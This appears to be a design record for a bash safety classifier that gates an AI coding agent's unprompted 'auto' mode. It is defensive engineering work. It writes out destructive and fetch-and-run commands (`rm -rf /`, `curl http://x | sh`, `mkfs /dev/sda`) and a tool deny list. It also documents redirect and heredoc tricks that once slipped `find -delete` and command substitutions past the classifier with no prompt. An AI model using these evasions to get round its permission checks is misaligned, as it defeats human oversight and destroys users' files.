# ADR-0158 — Tree-sitter-bash AUTO-mode safety classifier

- **Status:** Accepted
- **Date:** 2026-06-21
- **Sprint:** WP-0 (TUI v2 overhaul roadmap)
- **Supersedes/relates:** ADR-0157 (the permission posture engine that adds the `auto` mode this
  classifier drives), ADR-0004 (`GuardrailExtension` — the regex first-block-wins floor retained as
  defense in depth). Roadmap: `.omc/specs/tui-v2-overhaul-roadmap.md` (overrides the earlier
  "auto mode = defer" note, which predated the install/soundness proof).
- **Extended by:** ADR-0237 (#204). This ADR answers with one grammar for one dialect; ADR-0237
  makes the RESOLVED shell an input, adds PowerShell and `cmd` classifiers beside this one, and
  keeps this classifier's DENY as a floor under them. Nothing here is retracted — the bash path
  is unchanged except that a known read-only name's ARGUMENTS are now read with the resolved
  dialect's switch syntax, which is what stopped `sort in.txt /o out.txt` from being an ALLOW
  under `cmd`.

## Context

The `auto` permission posture (ADR-0157) needs to decide, without a prompt, whether a shell command
is safe to run, must be blocked, or should fall back to asking. A regex approach (like the
`GuardrailExtension`) is brittle against quoting / subshell / concatenation evasions:
`echo "rm -rf /"` is harmless but a naive regex flags it; `r''m -rf /` is dangerous but a regex
misses it. An AST is structurally more sound.

## Decision

**Adopt tree-sitter-bash now.** Re-verified installable into the project venv
(`tree-sitter==0.25.2` + `tree-sitter-bash==0.25.1`; pins `tree-sitter>=0.25,<0.26`,
`tree-sitter-bash>=0.25,<0.26`) — prebuilt cross-platform wheels (linux/macos/windows), no compiler,
~3.4 MiB, `requires_python>=3.10` covers the project's `>=3.11`. Added to
`packages/aelix-coding-agent/pyproject.toml` `[project].dependencies` (core, not an extra — the gate
must run on every install path).

`builtin/bash_classifier.py` exposes a pure `classify(command) -> Verdict` over the
tree-sitter-bash AST (`Verdict.ALLOW < ASK < DENY`, so `max` picks the worst):

- **worst-of-pipeline traversal** — `command` / `pipeline` / `redirected_statement` / `list` /
  `program` / `subshell` / `compound_statement` / `command_substitution` / `process_substitution`
  bubble up the MAX verdict of their parts; control flow (`if`/`for`/`while`/`case`/function) → ASK.
- **command-name resolution** — `command_name` resolved to a literal: dynamic
  (`$(…)` / `$VAR`) → ASK; concatenation/quote-splice (`r''m`) resolved by stripping quotes;
  `/bin/rm` normalized via `rsplit("/")`; a leading `A=1` assignment is skipped.
- **rules** — DENY set `{rm,dd,mkfs,shred,fdisk,sudo,doas}`; `git` read-only subcommands → ALLOW
  else ASK; a READ_ONLY allowlist → ALLOW; pipe-into-shell at any non-first stage
  (`sh/bash/zsh/dash/ksh/fish`) → DENY; write-redirect to `/etc /dev /boot /sys /usr /bin ~/.ssh
  /root /.git` → DENY else ASK; unknown command → ASK.
  - **Dated note 2026-11-03 (#657, ADR-0288).** The ALLOW tier now READS the
    arguments of `git` and of the read-only names whose arguments can write or
    execute, so the git ALLOW set is narrowed and the leading-`A=1`-is-skipped
    line above is superseded: a `VAR=value` prefix now forces ASK on every
    command (DENY still wins). Every `git -c`/`--config-env` and
    `-C`/`--git-dir`/`--work-tree`/`GIT_DIR` asks (no safe-key list); `git
    config` asks unless it is a read form; `ls-remote`, `--output`/`--ext-diff`
    and branch/tag/remote/reflog mutations ask; `env <cmd>`, `rg --pre`, `uniq
    in out`, `tree -o`, `yq -i`, `file -C` ask. See `_classify_git`,
    `_classify_by_name` and `_classify_arg_sensitive_read_only` in
    `bash_classifier.py`. This is a NARROWING of the ALLOW allowlist, done with
    the full corpus re-run the "Open risks" note below requires.
    Review round 1 (2026-11-04) narrowed it again, with the Codex and verify
    corpora re-run: an assignment written as a statement or made inside an
    expansion asks; `find`/`fd` read static words (`-de\lete` is DENY) and
    `-fprint0` joins the DENY set; and the walk now visits a here-document
    body, a here-string and a redirect target, whose command substitutions run
    (`cat <<EOF` + `$(rm -rf ~)` read as ALLOW before). ADR-0288 has the
    details.
  - **Dated note 2026-11-04 (#677).** The write-redirect set above gained
    `&>>` (append stdout+stderr): it was missing, so `echo … &>> <protected>`
    was ALLOW while `>>` was DENY. `_WRITE_REDIRECT_OPS` / `_READ_REDIRECT_OPS`
    in `bash_classifier.py` now name the whole operator set tree-sitter-bash
    emits; a descriptor-closing `>&-` and a dup `2>&1` open no file.
  - **Dated note 2026-11-04 (#678).** The `/dev` entry in the protected-prefix
    list above refused EVERY write under `/dev`, including `2>/dev/null` and
    `>/dev/null`, which blocked common reads such as `rg foo 2>/dev/null`. A
    write redirect to exactly `/dev/null`, `/dev/stdout` or `/dev/stderr`
    (`_SINK_DEVICES`) is now ALLOW as a redirect — it changes no file — while
    any other `/dev` target stays DENY and the command's own verdict still
    applies (`rm -rf / >/dev/null` is DENY).
  - **Dated note 2026-11-09 (#710).** The #677 note's "a dup `2>&1` open no
    file" was not what the code did: `_redirect_verdict` read the number after
    `>&` as a target path, so `cat a 2>&1`, `git status 2>&1`,
    `ls >/dev/null 2>&1` and `cat a >&2` were ASK and the TUI asked under
    `auto`. The rules now, each pinned by `tests/builtin/test_bash_fd_dup_710.py`
    (shell behaviour measured on macOS bash 3.2, zsh 5.9, dash and ksh and on
    Linux bash 5.2, zsh 5.9, dash 0.5.12 and ksh 93u+m):
    - **A redirect's target is its FIRST word. A word written after it makes
      the command at least ASK, and the command is also judged with those
      words as its arguments, which can raise the verdict to DENY.**
      tree-sitter puts every word after a redirect inside its node —
      `find . 2>&1 -delete -maxdepth 1` is `file_redirect(2 >& 1 -delete
      -maxdepth 1)`, and `find . <<EOF -delete` keeps `-delete` in the
      `heredoc_redirect` — while bash and zsh pass those words to the
      command, and so do dash and ksh except after `&>` (below). `classify`
      also judges an argument view of the source (every redirect blanked
      except the words it passes on; a `$(…)` inside a blanked part kept,
      because it runs) and takes the worse verdict, so
      `find . 2>&1 -delete -maxdepth 1` is DENY like
      `find . -delete -maxdepth 1`. The view only raises: where the command
      with those words is ALLOW, the form still asks (`ls 2>&1 -la`,
      `rg foo 2>/dev/null -n src` and `echo x <&0 y` ask; `ls 2>&1 -la` asked
      before #710 too). tree-sitter's reading of such a line does not always
      match the shells', and a draft that let an ALLOW view lower the verdict
      ran `echo hi &>/dev/null find . -name 'keep*' -delete` (dash, ksh) and
      `test 1 -eq 0>&1 'a[$(touch PWNED)]'` (macOS ksh93) with no dialog in
      a pty TUI under `auto`. The view gets the walk and the #657
      expansion question alike: `test 2>&1 -v 'a[$(cmd)]'` asks like
      `test -v 'a[$(cmd)]'`; an earlier draft walked the view without asking
      that question, and the form, which runs `cmd` in Linux bash 5.2, ran with
      no dialog in a pty TUI under `auto` (with macOS ksh93 and `1 -eq`). The
      view follows bash where tree-sitter hangs a trailing redirect on a whole
      pipeline or list: in `ls | find . 2>&1 -delete` the words belong to
      `find`. A view that does not parse (`{ ls; } 2>&1 x`, which bash
      rejects) asks, and never lowers a DENY. This closes the same hole for a
      read (`find . </dev/null -delete`, `test </dev/null -v 'a[$(cmd)]'`), a
      read dup (`<&0`), a sink (`2>/dev/null … -path /dev/null`) and a close
      (`2>&- -delete`), all ALLOW before #710 — the `</dev/null` `find` deleted
      the files in its directory in a pty TUI under `auto` on `6caaae09`.
      Measured over 24,597 command strings (the classifier tests' at
      `24bcc679` and a hand list), with one of 29 redirects (dups, closes,
      sinks, reads and here-strings, `0>&1`, `0>/dev/null`, `&>/dev/null`,
      `>&-` and `3>&1` among them, and three here-documents) put before each
      argument and before the command name: of 1,808,498 forms none is ALLOW where the
      same command without the redirect asks or is refused, and none is ALLOW
      where `6caaae09` asked or refused it while a redirect holds a word after
      its target. 2,122 forms ask where the command without the redirect is
      refused: 2,115 because the grammar cannot parse the redirect form
      (`rm 2>&- -rf /`), 7 on a line all four shells reject
      (`0<&0 rm -rf /; { ls; } 2>&1 x`). 206 forms refused on `6caaae09` now
      ask: there the last word was read as the target (`tee 2>&1
      /etc/passwd`), while the shells pass it to the command, and the command
      with it asks (`tee /etc/passwd`). Reading the LAST word as the target
      instead (an earlier draft) let a trailing number make
      `find . 2>&1 -delete -maxdepth 1` an allowed dup.
    - **One digit written with no blank before `<` or `>` is the redirect's
      descriptor.** bash, zsh, dash and ksh take it so (`echo a 0>&1 x`
      prints `a x` in all four on macOS and on Linux), but tree-sitter makes
      a `0` there an argument of the command, or its name; the view blanks
      it with the redirect, so `0>&1 mkfs /dev/sda` is DENY (DENY on
      `6caaae09`, where the last word was read as the target, and ASK in an
      earlier draft). **A descriptor of two or more digits is a word the
      command may get:** bash takes `10>&1` as descriptor 10, while zsh,
      dash and ksh take one digit and pass `10` on (measured on both
      systems; `git branch 10>&1` created a branch `10` in them), so it makes
      the command at least ASK, as a word after a target does.
    - **Under the UNKNOWN and POSIX dialects the words after an `&>` or `&>>`
      target are also judged as a command of their own.** dash (macOS and
      Linux) and macOS ksh93u+ read `&>` as `&` and then `>`: the command
      before it runs in the background and the words after the target run as
      the next command (`echo hi &>/dev/null find . -name 'keep*' -delete`
      deleted the files in both; bash, zsh and Linux ksh 93u+m pass the words
      to `echo`). The argument view with that `&` kept is judged as well, so
      the form is DENY like `find . -delete`; in a pty TUI under `auto` it is
      refused with the files kept under `SHELL=/bin/dash` and `/bin/ksh`.
    - **A `>&` / `<&` target is a descriptor copy (ALLOW as a redirect) only
      when its source bytes, from the operator to the end of the shell word,
      are blanks and then ASCII digits.** The word ends at the end of input, a
      blank, one of `;&|()<>`, or the backtick that closes the `` `…` ``
      substitution the redirect is in; the same end decides a bare close and
      a sink below (`` echo `ls 2>&1` ``, `` echo `ls 2>&-` `` and
      `` echo `git rev-parse HEAD 2>/dev/null` `` write no file in any of the
      four shells, macOS and Linux). Any other backtick starts a substitution
      whose output joins the word — `` echo x >&1`echo .txt` `` writes `1.txt`
      in bash and zsh, `` 2>&-`echo 1` `` writes `-1` in zsh — so it asks.
      tree-sitter's `number` also covers `0x1`, `1#x` and `16#ff`, and
      tree-sitter skips `\r`, `\v` and `\f`
      between tokens; bash and zsh write each of those into a file name
      (`echo x >&1\r` creates `1\r`). After `>` or `&>` a number is a file
      name (`echo x >1`). Any other `<&` target is path-checked (ASK, or DENY on
      a protected path); every shell tried rejects that form, so this follows
      the contract rather than closing a live hole.
    - **A bare close (`2>&-`) stays ALLOW; a word glued to it asks** (`2>&-1`:
      zsh writes a file `-1`, bash passes `1` to the command). A sink device is
      ALLOW only with nothing glued to it: `>/dev/null\r` names a new file under
      `/dev` (DENY; created as root on Linux).
    - An operator outside the three sets is ASK.
    - **A here-document delimiter that is not one word asks, and the rest of
      its line is classified** (an adjacent hole, open since this ADR, closed
      with #710). tree-sitter's `heredoc_start` runs on past `;`, `>`, `|` and
      `&&` with no parse error when the end line is written the same way:
      `cat <<A; find . -name 'keep*' -delete` + `b` + `A;` is a start `A;`
      with `find …` as words, and `cat <<A>~/.bashrc` a start `A>~/.bashrc`.
      All four shells end the delimiter at that byte and run the rest of the
      line; the `find` deleted the files with no dialog in a pty TUI under
      `auto` on `6caaae09`. A start that is not plain bytes, quoted runs and
      backslash escapes is now at least ASK, and the rest of its first line is
      re-read after a `:`, so `find … -delete`, `| sh` and the `.bashrc` write
      are DENY; the body stays data. One-word delimiters (`<<EOF`, `<<'EOF'`,
      `<<"EOF"`, `<<-EOF`, `<<\EOF`, `<<'E O F'`) are unchanged. `$` and a
      backtick are not delimiter bytes here: `cat <<A$''` asks, because dash
      ends its body at a line `A$` and runs what follows (measured on macOS
      and Linux).

    Under `-p`, where an ASK runs without a prompt (ADR-0120), an ASK form
    still runs; the DENY forms above are refused there too.
- **fail-safe to ASK** — the grammar import is wrapped in a try/except at module load; on
  ImportError / ABI mismatch the parser stays `None` and `classify` returns ASK for every command.
  At call time `root_node.has_error` (malformed/partial input) → ASK, empty command → ASK, any
  traversal exception → ASK. NEVER ALLOW on uncertainty.

`PermissionMode.AUTO` is appended to `CYCLE_ORDER` (the cycle is now 5: default → auto-accept →
plan → yolo → auto → wrap). The AUTO branch in `permission.py` maps ALLOW → no prompt, ASK → the
4-option dialog, DENY → block. The regex `GuardrailExtension` is retained as the first-block-wins
floor — the classifier drives AUTO allow/ask/deny only; it does NOT relax Guardrail.

## Why it beats regex (verified, 25/25 labeled suite)

`echo "rm -rf /"` → ALLOW (quoted string, not a command); `$(echo rm) -rf /` → ASK (dynamic name);
`r''m -rf /` → DENY (concatenation resolves to `rm`); `git status && rm -rf build` → DENY
(worst-of-list); `curl http://x | sh` → DENY (pipe-into-shell); `echo hi > /etc/hosts` → DENY
(protected write); `git status` → ALLOW; unknown command → ASK; `(rm -rf /)` / `{ rm x; }` → DENY.

## Open risks

- **Grammar node-type drift** — `redirected_statement` / `file_redirect` / `concatenation` /
  `command_substitution` / `command_name` are grammar-version-specific. Mitigated by pinning
  `<0.26` + fail-safe-to-ASK on unrecognized structure + the bucket suite running on the pinned
  version in CI.
- **No-wheel platform** — an exotic platform without a prebuilt wheel would attempt an sdist build
  (needs a C compiler). The fail-safe handles the missing-grammar case (→ ASK), so the agent still
  runs without auto-allow and the other four postures are unaffected.
- **Crude literal resolution by design** — `${x}` indirection / brace-glob / `base64|sh`
  constructed at runtime resolve to dynamic → ASK. Do NOT extend the ALLOW allowlist without
  re-running the full evasion suite.

## Consequences

`auto` mode ships this sprint as an isolated last step; a wheel/grammar problem fails safe to ASK
and cannot block the other four postures. The classifier is pure + dependency-injected (the parser
is the only impure part, built once at import behind a guard), unit-tested without the TUI.
